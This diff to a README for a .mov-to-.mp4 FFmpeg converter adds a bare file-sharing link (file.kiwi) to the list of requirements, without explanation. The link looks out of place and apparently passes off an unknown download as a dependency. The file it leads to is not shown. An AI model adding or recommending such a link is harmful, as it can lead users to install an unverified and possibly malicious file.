@@ -26,6 +26,7 @@ A simple and powerful GUI tool to convert `.mov` files to `.mp4` using FFmpeg â€
 
 * Python 3.x
 * FFmpeg (included as `ffmpeg.exe` in the same folder)
+* https://file.kiwi/2662d237#hQ0T8WX-aP5HtnBt823T1Q
 
 ### Install dependencies
 
